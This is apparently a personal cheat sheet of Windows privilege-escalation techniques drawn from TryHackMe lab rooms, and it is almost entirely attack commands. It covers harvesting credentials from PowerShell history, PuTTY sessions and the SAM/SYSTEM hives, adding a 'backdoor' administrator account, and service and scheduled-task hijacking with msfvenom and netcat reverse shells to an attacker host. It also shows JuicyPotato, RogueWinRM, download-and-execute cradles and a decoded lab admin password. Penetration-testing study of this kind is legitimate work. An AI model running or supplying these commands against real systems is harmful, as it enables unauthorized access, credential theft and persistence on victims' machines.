# Windows

**Copy info from here:** [**https://tryhackme.com/room/windowsprivesc20**](https://tryhackme.com/room/windowsprivesc20)



## **Gathering Info**

```
whoami /priv
```

```
net user
```

```
systeminfo
```

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```
dir c:\
```

```
dir "c:\program files"
```

```
dir "c:\program files (x86)"
```

```
wmic service get name,startname
```

```
wmic service get name,pathname,startname | findstr "Program Files"
```

Find text in file

```
type C:\Windows\path\to\file\$FILE | findstr $STRING
```

### **Whoami /priv**

| Finding                 | Comment                                                 | Examples                                                                |
| ----------------------- | ------------------------------------------------------- | ----------------------------------------------------------------------- |
| SeImpersonatePrivilege  | Printspoofer - works on Windows 10 and Server 2016/2019 | [relevant.md](../../../../walkthroughs/tryhackme/relevant.md "mention") |
|                         |                                                         |                                                                         |
|                         |                                                         |                                                                         |



## Harvesting Passwords from Usual Spots

Might be able to find interesting files by looking at what was recently accessed. Start -> run -> recent.

<figure><img src="../../../../.gitbook/assets/image (3) (5).png" alt=""><figcaption></figcaption></figure>

### **Powershell history**

**Examples**

[#harvesting-passwords-from-usual-spots](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")

**Victim(cmd)**

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Examples**

[#harvesting-passwords-from-usual-spots](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")

Need GUI to see other command prompt that will be spawned

**Victim(cmd)**

```
cmdkey /list
runas /savecred /user:$DOMAIN\$USERNAME cmd.exe
```

**Examples**

[#harvesting-passwords-from-usual-spots](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")

Retrieve the saved password stored in the saved PuTTY session under your profile.&#x20;

**Victim(cmd)**

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### See hidden files

**Examples**

[anthem.md](../../../../walkthroughs/tryhackme/anthem.md "mention")

<figure><img src="../../../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### System and Sam

#### Download system and sam

**Examples**

[#tampering-with-unprivileged-accounts](../../../../walkthroughs/tryhackme/windows-local-persistence.md#tampering-with-unprivileged-accounts "mention")

**Kali(WinRM)**

```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```

#### Dump hashes

**Examples**

[#tampering-with-unprivileged-accounts](../../../../walkthroughs/tryhackme/windows-local-persistence.md#tampering-with-unprivileged-accounts "mention")

**Kali**

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```



## Add User & Assign Group Memberships

**Victim**

```
net user backdoor pass!123 /add
net localgroup Administrators backdoor /add
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f
```

### **Enable RDP**

**Victim**

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### Add user to RDP Group

**Examples**

[#assign-group-memberships](../../../../walkthroughs/tryhackme/windows-local-persistence.md#assign-group-memberships "mention")

Add user to group that allows them to RDP

**Victim(cmd)**

```
net localgroup "Remote Management Users" $USER /add
```

## Scheduled Tasks

**Examples**

[windows-privilege-escalation.md](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md "mention")[#abusing-scheduled-tasks](../../../../walkthroughs/tryhackme/windows-local-persistence.md#abusing-scheduled-tasks "mention")

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the schtasks command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

**Victim(cmd)**

```
schtasks 
```

**Victim(cmd)**

```
schtasks /query /tn $TASK /fo list /v
```

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

```
icacls c:\tasks\schtask.bat
```

<figure><img src="../../../../.gitbook/assets/image (20) (5) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 4444
```

**Victim**

```
echo c:\tools\nc64.exe -e cmd.exe $KALI 4444 > C:\tasks\schtask.bat
schtasks /run /tn $TASK 
```



## Abusing Service Misconfigurations

**Examples**

[#abusing-service-misconfigurations](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#abusing-service-misconfigurations "mention")

### Insecure Permissions on Service Executable

**Get the flag on svcusr1's desktop**

**Victim(cmd)**

```
sc qc WindowsScheduler
```

<figure><img src="../../../../.gitbook/assets/image (21) (5) (1).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd)**

```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4445 -f exe-service -o rev-svc.exe
python2 -m SimpleHTTPServer 81
```

**Victim(Powershell)**

```
wget http://$KALI:81/rev-svc.exe -O rev-svc.exe
```

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well.

**Victim(Powershell)**

```
cd C:\PROGRA~2\SYSTEM~1\
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```

**Kali**

```
nc -lvp 4445
```

**Note:** PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:

**Victim(cmd)**

```
sc stop windowsscheduler
sc start windowsscheduler
```

**OR**

**Victim(Powershell)**

```
sc.exe stop windowsscheduler
sc.exe start windowsscheduler
```

<figure><img src="../../../../.gitbook/assets/image (31) (2).png" alt=""><figcaption></figcaption></figure>

### Unquoted Service Paths

**Examples**

[#unquoted-service-paths](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#unquoted-service-paths "mention")

**Victim(cmd)**

```
 sc qc "disk sorter enterprise"
```

<figure><img src="../../../../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4446 -f exe-service -o rev-svc2.exe
python2 -m SimpleHTTPServer 81
```

**Victim(Powershell)**

```
wget http://10.10.15.215:81/rev-svc2.exe -O rev-svc2.exe
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

**Kali**

```
nc -lvp 4446
```

**Victim(cmd)**

```
sc.exe stop "disk sorter enterprise"
sc.exe start "disk sorter enterprise"
```

<figure><img src="../../../../.gitbook/assets/image (3) (1) (4).png" alt=""><figcaption></figcaption></figure>

### Insecure Service Permissions

**Examples**

[#insecure-service-permissions](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#insecure-service-permissions "mention")

**Victim(cmd)**

```
cd C:\tools\AccessChk
accesschk64.exe -qlc thmservice
```

<figure><img src="../../../../.gitbook/assets/image (7) (8) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4447 -f exe-service -o rev-svc3.exe
python2 -m SimpleHTTPServer 81
```

**Victim(Powershell)**

```
wget http://10.10.15.215:81/rev-svc3.exe -O rev-svc3.exe
```

**Kali**

```
nc -lvp 4447
```

**Victim(Powershell)**

```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
sc.exe stop THMService
sc.exe start THMService
```

<figure><img src="../../../../.gitbook/assets/image (16) (3).png" alt=""><figcaption></figcaption></figure>

## Abusing dangerous privileges

**Examples**

[#abusing-dangerous-privileges](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#abusing-dangerous-privileges "mention")

<figure><img src="../../../../.gitbook/assets/image (32) (3).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvp 4442
```

**Victim(Browser)**

```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.22.165 4442"
```

<figure><img src="../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

## Bypassing UAC

**Examples:**

[bypassing-uac.md](../../../../walkthroughs/tryhackme/bypassing-uac.md "mention")

## Bypassing Applocker

**Examples:**

[#bypassing-applocker](../../../../walkthroughs/tryhackme/corp.md#bypassing-applocker "mention")

Load PowerUp.ps1 into memory.

**Kali**

```
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
python2 -m SimpleHTTPServer 81
```

Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded

**PowerUp.ps1**

```
Invoke-AllChecks
```

**Victim(powershell)**

<pre><code>powershell -ep bypass
<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1') 
</strong></code></pre>

<figure><img src="../../../../.gitbook/assets/image (3) (3) (2).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../../.gitbook/assets/image (1) (1) (8).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo "dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=" | base64 -d
```

<figure><img src="../../../../.gitbook/assets/image (11) (5).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
xfreerdp +clipboard /u:"Administrator" /v:$VICTIM:3389 /size:1024x568 /smart-sizing:800x1200
Password: tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```

## Privilege Escalation



## **Automated Enumeration Tools**

| Name                      | Link                                                                                                                                                                                  |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| WinPeas                   |                                                                                                                                                                                       |
| PowerUp.ps1               | [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 ](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) |
| Windows Exploit Suggester | [https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git](https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git)                                                        |
| SharpHound                | <pre><code>git clone https://github.com/BloodHoundAD/BloodHound.git
</code></pre>                                                                                                     |
| Powerview                 |                                                                                                                                                                                       |



## **Juicy Potato**

**Examples**

[retro.md](../../../../walkthroughs/tryhackme/retro.md "mention")

* Download Juicy Potato to your attack machine
* Upload Juicy Potato to the target (ex: via FTP, SMB, HTTP, etc.)
* Create a reverse shell and upload it to the target (ex: via FTP, SMB, HTTP, etc.) use Juicy Potato to execute your reverse shell

```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

```
JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
```



## PowerUp.ps1

**Examples**

[#privilege-escalation](../../../../walkthroughs/tryhackme/steel-mountain.md#privilege-escalation "mention")[retro.md](../../../../walkthroughs/tryhackme/retro.md "mention")

**Setup**

**Kali**

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 
python2 -m SimpleHTTPServer 81
```

**Victim(cmd)**

```
certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1 
. .\PowerUp.ps1 
Invoke-AllChecks
```

**OR**

**Victim(powershell)**

<pre><code>powershell -ep bypass
<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1')
</strong></code></pre>



## Windows Exploit Suggester

**Examples**

[hackpark.md](../../../../walkthroughs/tryhackme/hackpark.md "mention")

**Setup**

Run command then paste output back to Kali in a file called systeminfo.txt

**Victim**

```
systeminfo
```

**Kali**

```
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git 
cd Windows-Exploit-Suggester/ 
python3.9 windows-exploit-suggester.py --update 
python3.9 windows-exploit-suggester2.py --database 2022-12-03-mssb.xls --systeminfo systeminfo.txt
```

## **WinPeas**

**Examples**

[hackpark.md](../../../../walkthroughs/tryhackme/hackpark.md "mention")

**Setup**

**Kali**&#x20;

```
wget https://github.com/carlospolop/PEASS-ng/releases/download/20221127/winPEASx64.exe 
python2 -m SimpleHTTPServer 82
```

**Victim**&#x20;

```
cd C:\Windows\Temp
powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:82/winPEASx64.exe','winPEASx64.exe')" 
winPEASx64.exe
```



## SharpHound

**Examples**

[post-exploitation-basics.md](../../../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")

Add this line to SharpHound.ps1 before transferring so I could run the command right away

<figure><img src="../../../../.gitbook/assets/image (3) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
powershell -ep bypass
.\SharpHound.ps1
```

**Kali**

```
apt-get install bloodhound
neo4j console
bloodhound --no-sandbox
```

### Find all Domain Admins

<figure><img src="../../../../.gitbook/assets/image (15) (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (84) (1) (1).png" alt=""><figcaption></figcaption></figure>

### List all Kerberostable accounts

<figure><img src="../../../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>



## Powerview

**Examples**

[post-exploitation-basics.md](../../../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")

**Victim**

Run below to be able to run PowerView commands.

```
powershell -ep bypass
. .\Downloads\PowerView.ps1
```

Enumerate the domain users.

```
Get-NetUser | select cn
```

Enumerate the domain groups.

```
Get-NetGroup -GroupName *admin*
```

Find Shared folders.

```
Invoke-ShareFinder
```

Get Operating systems on the network.

```
Get-NetComputer -fulldata | select operatingsystem
```



